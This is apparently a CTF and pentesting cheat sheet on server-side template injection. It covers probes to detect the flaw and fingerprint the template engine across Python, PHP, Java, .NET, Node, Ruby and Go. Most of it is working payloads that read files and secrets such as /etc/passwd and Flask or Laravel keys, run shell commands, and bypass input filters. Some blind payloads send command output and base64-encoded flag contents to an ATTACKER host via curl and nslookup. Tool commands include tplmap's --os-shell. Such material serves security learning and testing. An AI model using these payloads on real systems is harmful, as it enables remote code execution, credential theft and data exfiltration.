# SSTI

Use when user input is rendered as a template, not just inserted as data.

## Test

```text
{{7*7}}
{{7*"7"}}
${7*7}
#{7*7}
*{7*7}
@{7*7}
<%= 7*7 %>
${{7*7}}
{{= 7*7 }}
{= 7*7 }
```

Error trigger:

```text
${{<%[%'"}}%\
{{1/0}}
${1/0}
<%= 1/0 %>
```

If input is inside an existing expression, break out first:

```text
}}<h1>x</h1>
}}{% print(7*7) %}{{
'}}<h1>x</h1>
"}}<h1>x</h1>
```

## Guess Engine

```text
{{7*7}}        -> Jinja2, Twig, Nunjucks, Go template, Handlebars-like
{{7*"7"}}      -> Jinja2: 7777777, Twig: 49
${7*7}         -> FreeMarker, Java EL, SpEL
#{7*7}         -> FreeMarker legacy, Pebble, SpEL, Pug/Jade text interpolation
*{7*7}         -> Thymeleaf / SpEL
<%= 7*7 %>     -> ERB, EJS, JSP
```

Error language clues:

```text
ZeroDivisionError                 Python / Jinja / Mako / Tornado
ArithmeticException               Java / FreeMarker / Velocity / SpEL
ReferenceError / TypeError        Node / EJS / Pug / Nunjucks
DivisionByZeroError               PHP / Twig / Smarty
divided by 0                      Ruby / ERB
```

## Flask / Jinja2

Info:

```jinja
{{config}}
{{config.items()}}
{{request}}
{{request.args}}
{{request.cookies}}
{{self.__dict__}}
{{url_for.__globals__}}
{{get_flashed_messages.__globals__}}
{{lipsum.__globals__}}
{{cycler.__init__.__globals__}}
{{joiner.__init__.__globals__}}
{{namespace.__init__.__globals__}}
```

Read files:

```jinja
{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}}
{{config.__class__.from_envvar.__globals__.__builtins__.open('/flag.txt').read()}}
{{lipsum.__globals__.__builtins__.open('/flag.txt').read()}}
{{cycler.__init__.__globals__.__builtins__.open('/flag.txt').read()}}
```

Command execution through globals:

```jinja
{{lipsum.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Subclass route:

```jinja
{{''.__class__.__mro__[1].__subclasses__()}}
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{loop.index0}} {{c}}{% endif %}{% endfor %}
{{''.__class__.__mro__[1].__subclasses__()[IDX]('id', shell=True, stdout=-1).communicate()[0]}}
{{''.__class__.__base__.__subclasses__()[IDX]('cat /flag.txt', shell=True, stdout=-1).communicate()[0]}}
```

Python helper to find index locally:

```python
for i, c in enumerate("".__class__.__base__.__subclasses__()):
    if "Popen" in c.__name__:
        print(i, c)
```

Flask secret:

```jinja
{{config['SECRET_KEY']}}
{{config.SECRET_KEY}}
{{self.__dict__}}
```

Source/code cache:

```jinja
{{lipsum.__globals__.os.sys.modules.linecache.cache}}
{{url_for.__globals__['current_app'].config}}
```

## Jinja2 Bypass

No dot:

```jinja
{{request|attr('application')}}
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
{{config|attr('__class__')|attr('from_envvar')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
```

No underscore:

```jinja
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

No `{{ }}`:

```jinja
{% print 7*7 %}
{% if lipsum.__globals__.os.popen('id').read() %}x{% endif %}
{% with x=lipsum.__globals__.os.popen('id').read() %}{% print x %}{% endwith %}
```

Use request parameters to supply blocked strings:

```text
?a=__class__&b=__mro__&c=__subclasses__&d=__globals__&e=os&p=id
```

```jinja
{{''|attr(request.args.a)|attr(request.args.b)|last|attr(request.args.c)()}}
{{lipsum|attr(request.args.d)|attr('__getitem__')(request.args.e)|attr('popen')(request.args.p)|attr('read')()}}
```

String split/concat:

```jinja
{{lipsum.__getattribute__('__gl'+'obals__')}}
{{lipsum.__getattribute__('__gl'+'obals__')['os'].popen('id').read()}}
{{request|attr(['__','class','__']|join)}}
```

Blind / delayed:

```jinja
{{lipsum.__globals__.os.popen('sleep 5').read()}}
{{lipsum.__globals__.os.popen('curl http://ATTACKER/`whoami`').read()}}
{{lipsum.__globals__.os.popen('cat /flag.txt | base64 -w0 | xargs -I{} curl http://ATTACKER/{}').read()}}
```

## Mako / Tornado

Mako:

```mako
${7*7}
${self}
${__import__('os').popen('id').read()}
<% import os %>${os.popen('id').read()}
```

Tornado:

```text
{{7*7}}
{% import os %}
{{os.popen('id').read()}}
{% import subprocess %}
{{subprocess.check_output('id', shell=True)}}
```

## Django Templates

Django templates are usually weaker than Jinja because function calls and private attributes are restricted. Look for exposed context objects and custom filters.

```django
{{7|add:7}}
{% debug %}
{{settings}}
{{settings.SECRET_KEY}}
{{request}}
{{request.META}}
{{request.COOKIES}}
{{user}}
```

## Twig / PHP

Basic:

```twig
{{7*7}}
{{7*"7"}}
{{_self}}
{{app.request}}
{{app.request.server.all|join(',')}}
{{dump(app)}}
```

File/source:

```twig
{{include('/etc/passwd')}}
{{source('/etc/passwd')}}
{{'/etc/passwd'|file_excerpt(1,30)}}
```

Older Twig RCE patterns:

```twig
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
{{_self.env.registerUndefinedFunctionCallback('system')}}{{_self.env.getFunction('id')}}
```

Symfony app object:

```twig
{{app.request.server.get('APP_SECRET')}}
{{app.request.server.get('DATABASE_URL')}}
```

Smarty:

```smarty
{7*7}
{$smarty.version}
{php}echo shell_exec('id');{/php}
{system('id')}
{`id`}
{self::getStreamVariable("file:///etc/passwd")}
```

Blade / Laravel:

```php
{{ 7*7 }}
{!! 7*7 !!}
{!! system('id') !!}
@php system('id'); @endphp
{{ config('app.key') }}
{{ env('APP_KEY') }}
```

Liquid:

```liquid
{{ 7 | times: 7 }}
{{ "id" | upcase }}
{{ site }}
{{ page }}
{{ settings }}
```

Liquid is usually sandboxed. Use it for data leaks and object discovery unless the app adds dangerous custom filters.

## Java Templates

Java EL / JSP:

```jsp
${7*7}
#{7*7}
${class.getClassLoader()}
${class.getResource('').getPath()}
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())}
```

FreeMarker:

```ftl
${7*7}
#{7*7}
[=7*7]
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

Velocity:

```velocity
#set($x=7*7)$x
#set($s='')$s.class
#set($s='')#set($rt=$s.class.forName('java.lang.Runtime').getRuntime())#set($p=$rt.exec('id'))$p.waitFor()
#set($s='')#set($p=$s.class.forName('java.lang.Runtime').getRuntime().exec('id'))#set($sc=$s.class.forName('java.util.Scanner').getConstructor($s.class.forName('java.io.InputStream')).newInstance($p.getInputStream()).useDelimiter('\\A'))#if($sc.hasNext())$sc.next()#end
```

JSON body wrapper:

```json
{"name":"#set($x=7*7)$x"}
{"name":"#set($s='')$s.class"}
{"name":"#set($s='')#set($rt=$s.class.forName('java.lang.Runtime').getRuntime())#set($p=$rt.exec('id'))$p.waitFor()"}
```

SpEL / Thymeleaf:

```text
${7*7}
*{7*7}
#{7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

OGNL:

```text
%{7*7}
%{@java.lang.Runtime@getRuntime().exec('id')}
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Leak','x')}
```

Razor / ASP.NET:

```cshtml
@(7*7)
@System.Environment.MachineName
@System.Environment.GetEnvironmentVariable("USERNAME")
@System.IO.File.ReadAllText("C:\\Windows\\win.ini")
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
```

Pebble:

```twig
{{7*7}}
{{'id'|split(',')}}
{{variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}
```

## Node Templates

EJS:

```ejs
<%= 7*7 %>
<%= process.version %>
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
<%= process.mainModule.require('child_process').execSync('cat /flag.txt').toString() %>
```

Pug / Jade:

```pug
#{7*7}
#{process.version}
#{process.mainModule.require('child_process').execSync('id').toString()}
```

Nunjucks:

```nunjucks
{{7*7}}
{{range.constructor("return process")().version}}
{{range.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()}}
```

Handlebars:

```handlebars
{{this}}
{{lookup this "constructor"}}
{{#with "s" as |string|}}{{string.sub}}{{/with}}
```

If Handlebars is the engine, first enumerate helpers and context keys. RCE usually depends on available helpers or an unsafe helper registration.

## Ruby / ERB

```erb
<%= 7*7 %>
<%= `id` %>
<%= system('id') %>
<%= IO.read('/etc/passwd') %>
<%= File.read('/flag.txt') %>
```

## Go Template

```gotemplate
{{printf "%#v" .}}
{{range $k,$v := .}}{{printf "%s=%v\n" $k $v}}{{end}}
{{range $k,$v := .Data}}{{printf "%s=%v\n" $k $v}}{{end}}
{{ getenv "FLAG" }}
{{ env "FLAG" }}
{{ index (env) "FLAG" }}
{{ .Request.Header }}
{{ .Ctx.Response.SendFile "/proc/self/environ" }}
{{ .Ctx.Response.SendFile "/flag.txt" }}
```

If braces are filtered before Unicode normalization:

```text
﹛﹛ .Ctx.Response.SendFile "/proc/self/environ" ﹜﹜
﹛﹛ .Ctx.Response.SendFile "/flag.txt" ﹜﹜
```

## CTF Patterns

Flask flag in config:

```jinja
{{config}}
{{config['FLAG']}}
{{url_for.__globals__['current_app'].config['FLAG']}}
```

`{{` and `}}` filtered:

```jinja
{% print config %}
{% if config['FLAG'] %}{{config['FLAG']}}{% endif %}
{% for k,v in config.items() %}{% print k %}:{% print v %}{% endfor %}
```

Underscore filtered:

```text
?u=__globals__&i=__import__&c=id
```

```jinja
{{lipsum|attr(request.args.u)|attr('__getitem__')('os')|attr('popen')(request.args.c)|attr('read')()}}
```

Only blind output:

```jinja
{{lipsum.__globals__.os.popen('curl http://ATTACKER/$(cat /flag.txt|base64 -w0)').read()}}
{{lipsum.__globals__.os.popen('nslookup `whoami`.ATTACKER').read()}}
```

Subclass index changes between Python versions, so do not copy `[502]` blindly. Enumerate and replace `IDX`.

Python expression sink found inside a template challenge:

```python
code = b'[c for c in "".__class__.__base__.__subclasses__()]'
code = b'[c for c in "".__class__.__base__.__subclasses__() if c.__name__=="Popen"][0]("cat /fl*", shell=True, stdout=-1).communicate()[0]'
code = b'"".__class__.__base__.__subclasses__()[502]'
code = b'"".__class__.__base__.__subclasses__()[502]("cat /flag.txt", shell=True, stdout=-1).communicate()[0]'
```

Old Velocity-like CTF payload shape:

```python
data = {"name": "#set( $foo = 7*7 )\n$foo"}
data = {"name": "#set($s='')#set($base=$s.__class__.__mro__[1])#foreach($sub in $base.__subclasses__())$foreach.index: $sub\n#end"}
data = {"name": "#set($x='')\n#set($cycler=$x.__class__.__mro__[1].__subclasses__()[479])\n#set($init=$cycler.__init__)\n#set($globals=$init.__globals__)\n#set($os=$globals.os)\n#set($popen=$os.popen('/readflag'))\n$popen.read()"}
```

Odd code-context gadget from the old sheet:

```text
+print+({lipsum:1})|list()|map(**{'attribute':'__globals__'})
```

## Tools

```bash
# SSTImap
python3 sstimap.py -u 'http://HOST/page?name=INJECT' -s
python3 sstimap.py -i -u 'http://HOST/page?name=INJECT*' -l 5

# tplmap, old but still useful in CTF boxes
python2.7 tplmap.py -u 'http://HOST/page?name=*' --os-shell

# TInjA
tinja url -u 'http://HOST/page?name=x'
tinja url -u 'http://HOST/' -d 'name=x'
```

## References

* [PortSwigger Web Security Academy: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
* [PayloadsAllTheThings: Server Side Template Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)
* [PayloadsAllTheThings GitHub tree: Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
* [PayloadsAllTheThings: Java SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md)
* [HackTricks: Jinja2 SSTI](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html)
* [HackTricks legacy mirror: SSTI](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection)
* [P=NP Flask/Jinja2 SSTI cheatsheet](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
* [DefCamp 2023 SSTI slides](https://def.camp/wp-content/uploads/dc2023/Remi%20Gascou.pdf)
* [CTFtime: TokyoWesterns CTF Shrine](https://ctftime.org/writeup/10895)
* [CTFtime: PatriotCTF Mr. O](https://ctftime.org/writeup/33605)
* [CTFtime: darkCON DMM](https://ctftime.org/writeup/26318)
* [CTFtime: n00bzCTF RIaaS](https://ctftime.org/writeup/34179)
